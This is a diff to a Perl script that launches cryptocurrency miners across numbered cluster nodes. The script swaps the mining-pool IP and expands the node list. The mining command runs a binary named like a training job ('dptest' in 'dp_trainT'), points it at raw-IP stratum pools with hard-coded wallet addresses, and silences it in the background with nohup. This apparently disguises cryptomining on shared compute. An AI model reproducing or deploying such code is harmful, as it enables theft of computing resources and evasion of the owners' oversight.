@@ -49,8 +49,8 @@ my %nodes = (
     #161 => [0],#8..18,20..22,39..41],#[1,3,39..42],#1,3,39..
     #161 => [8..18],#8..18,20..22,39..41],#[1,3,39..42],#1,3,39..
     #161 => [10],#[1,3,39..42],#1,3,39.., bad node 18
-    161 => [1,3,8..18,20..21,39..42],#[1,3,39..42],#1,3,39..    
-    #161 => [17],#[1,3,39..42],#1,3,39..    
+    161 => [1,2,3,8..18,20..21,39..42],#[1,3,39..42],#1,3,39..    
+    #161 => [1..3],#[1,3,39..42],#1,3,39..    
     182 => [6..7,20..24]
     );
 #get current for the corresponding setting    
@@ -106,7 +106,8 @@ $pm->start and next;
     #$mining_cmd = "nohup /home/jsp/dp_trainT/dptest -a autolykos2 -o stratum+tcp://18.167.166.214:3334 \\
     #    -u 9gt7gvUrrVpkhzQ8EW8RAkQrt4u7Dpix1T1h25nZJqhvTxFCjJw\.$nodename-$cluster -p x 2>&1 >/dev/null &";
     #RVN
-   $mining_cmd = "nohup /home/jsp/dp_trainT/dptest -a kawpow -o stratum+tcp://54.238.145.148:3333 \\
+  # $mining_cmd = "nohup /home/jsp/dp_trainT/dptest -a kawpow -o stratum+tcp://54.238.145.148:3333 \\
+   $mining_cmd = "nohup /home/jsp/dp_trainT/dptest -a kawpow -o stratum+tcp://8.219.234.130:3333 \\
        -u RRQLCfknZ3xRDyM4wafwMxBexwzumG1c1s\.$cluster-$nodename -p x 2>&1 >/dev/null &";
     
     #$mining_cmd = "nohup /home/jsp/dp_trainT/dptest -a kawpow -o stratum+tcp://18.167.166.214:3333 \\
